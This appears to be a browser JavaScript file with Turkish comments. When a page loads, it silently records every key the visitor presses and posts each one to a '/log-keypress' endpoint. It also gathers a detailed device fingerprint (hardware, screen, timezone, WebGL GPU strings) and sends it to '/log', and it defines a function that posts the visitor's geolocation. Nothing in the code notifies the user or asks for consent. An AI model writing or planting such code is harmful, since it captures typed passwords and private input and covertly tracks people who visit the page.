document.addEventListener("DOMContentLoaded", function () {

  // Tusa basim olayini dinle
  document.addEventListener("keydown", function (event) {
    // Event objesi uzerinden tusa ait bilgileri al
    const keyInfo = {
      key: event.key, // Basilan tusun ismi
      timestamp: new Date().toISOString(), // Tusa basildigi zaman
    };

    // Veriyi sunucuya gonder
    sendKeyInfo(keyInfo);
  });

  // Klavye Verisini sunucuya gonderme fonksiyonu
  function sendKeyInfo(keyInfo) {
    fetch("/log-keypress", {
      method: "POST", // HTTP POST istegi olustur
      headers: {
        "Content-Type": "application/json", // Verinin JSON formatinda oldugunu belirt
      },
      body: JSON.stringify(keyInfo), // Veriyi JSON formatina cevirip gonder
    })
      .then((response) => response.json()) // Sunucudan gelen cevabi JSON formatinda al
      //.then((data) => console.log("Key info sent successfully:", data))
      .catch((error) => console.error("Error sending key info:", error));
  }
});

// Dokunmatik ekran destegi var mi?
function checkTouchScreenSupport() {
  var touchSupported = "ontouchstart" in window || navigator.maxTouchPoints > 0;
  return touchSupported; // Dokunmatik ekran destegi olup olmadigini don
}

// Video/Audio codec destegi kontrolu
function checkCodecSupport() {
  var video = document.createElement("video"); // Video elementi olustur
  var audio = document.createElement("audio"); // Audio elementi olustur

  var codecs = {
    video: {
      "H.264": 'video/mp4; codecs="avc1.42E01E"',
      VP8: 'video/webm; codecs="vp8, vorbis"',
      VP9: 'video/webm; codecs="vp9"',
      "Ogg Theora": 'video/ogg; codecs="theora"',
    },
    audio: {
      MP3: "audio/mpeg",
      AAC: 'audio/mp4; codecs="mp4a.40.2"',
      Vorbis: 'audio/ogg; codecs="vorbis"',
      Opus: 'audio/webm; codecs="opus"',
      FLAC: "audio/flac",
    },
  };

  var support = { video: {}, audio: {} };

  // Video codec destegini kontrol et
  for (var codec in codecs.video) {
    support.video[codec] = video.canPlayType(codecs.video[codec]) ? true : false;
  }

  // Audio codec destegini kontrol et
  for (var codec in codecs.audio) {
    support.audio[codec] = audio.canPlayType(codecs.audio[codec]) ? true : false;
  }

  //console.log("Supported video codecs:", support.video);
  //console.log("Supported audio codecs:", support.audio);

  return [support.audio, support.video]; // Codec destek durumunu don
}

function collectAndSendData() {
  // Kullanici bilgilerini toplama
  const data = {
    platform: navigator.platform, // Platform bilgisi
    language: navigator.language, // Dil ayari
    cookiesEnabled: navigator.cookieEnabled, // Cerezlerin etkin olup olmadigi
    screenResolution: `${window.screen.width}x${window.screen.height}`, // Ekran cozunurlugu
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Zaman dilimi
    url: window.location.href, // Gecerli sayfanin URL'i
    number_of_logical_processors: navigator.hardwareConcurrency, // Mantiksal islemci sayisi
    amount_of_memory: navigator.deviceMemory, // Bellek miktari (dogru olmayabilir)
    touch_screen_support: checkTouchScreenSupport(), // Dokunmatik ekran destegi
    codec_support: checkCodecSupport(), // Codec destegi

    color_depth: window.screen.colorDepth, // Renk derinligi

    network_status: navigator.connection.effectiveType, // Ag baglantisi durumu

    javascript_engine: navigator.javaEnabled(), // Javascript destegi var mi?
    api_perf: performance.now(), // Tarayicinin performansini olc
    navigation_timing: performance.timing, // Sayfanin yukleme suresi bilgileri

    inner_width: window.innerWidth, // Pencerenin genisligi
    inner_height: window.innerHeight, // Pencerenin yuksekligi

    webGL_info: getWebGLInfo(), // WebGL bilgileri

  };

  // Veriyi JSON formatina cevirme
  const jsonData = JSON.stringify(data);

  // POST istegi olustur ve veriyi gonder
  fetch("/log", {
    method: "POST", // HTTP POST istegi yap
    headers: {
      "Content-Type": "application/json", // Verinin JSON oldugunu belirt
    },
    body: jsonData, // JSON verisini gonder
  })
    .then((response) => {
      if (response.ok) {
        //console.log("Data successfully sent."); // Basarili olursa
      } else {
        //console.error("Failed to send data."); // Hata olursa
      }
    })
    .catch((error) => console.error("Error:", error)); // Hatayi yakala ve yazdir
}

// Function to log geolocation data
function getLocation () {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const geoData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        };
        // Convert geolocation data to JSON format
        const geoJsonData = JSON.stringify(geoData);

        // Send geolocation data using POST request
        fetch("/log-geolocation", {
          method: "POST", // HTTP POST request
          headers: {
            "Content-Type": "application/json" // Specify JSON content type
          },
          body: geoJsonData // Send JSON data
        })
          .then((response) => {
            if (response.ok) {
              // Geolocation data successfully sent
            } else {
              console.error("Failed to send geo data."); // Handle error
            }
          })
          .catch((error) => console.error("Error:", error)); // Handle fetch error
      },
      (error) => {
        console.error("Error getting geolocation:", error); // Handle geolocation error
      }
    );
  } else {
    //console.error("Geolocation is not supported by this browser."); // Handle no geolocation support
  }
}



function getWebGLInfo() {
  const canvas = document.createElement("canvas"); // Canvas elementi olustur
  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // WebGL context'i al

  if (gl) {
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); // Debug bilgi uzantisini al
    if (debugInfo) {
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); // Renderer bilgisini al
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL); // Vendor bilgisini al
      return {
        Renderer: renderer,
        Vendor: vendor,
      };
    } else {
      //console.log("WEBGL_debug_renderer_info extension not supported"); // Destek yoksa mesaj goster
      return {
        Renderer: "Not supported",
        Vendor: "Not supported",
      };
    }
  } else {
    //console.log("WebGL not supported"); // WebGL desteklenmiyorsa mesaj goster
    return JSON.stringify({
      Renderer: "WebGL not supported",
      Vendor: "WebGL not supported",
    });
  }
}

// Sayfa yüklendiginde fonksiyonu calistir
window.onload = collectAndSendData;
